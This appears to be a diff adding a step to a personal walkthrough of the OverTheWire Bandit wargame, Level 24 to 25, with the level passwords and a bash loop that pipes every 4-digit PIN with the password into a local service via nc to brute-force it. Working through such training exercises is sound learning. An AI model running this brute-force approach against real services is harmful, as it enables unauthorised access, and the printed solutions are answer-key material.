@@ -218,3 +218,18 @@ cat password
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  
   
   
+**Bandit Level 24 → Level 25**  
+ssh bandit24@bandit.labs.overthewire.org -p 2220  
+mkdir /tmp/dir_name  
+cd /tmp/dir_name  
+vim script.sh
+`
+#!/bin/bash  
+password24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  
+for i in {0000..9999}  
+  do  
+    echo $password24 $i >> passlist.txt  
+  done  
+`  
+cat passlist.txt | nc localhost 30002
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
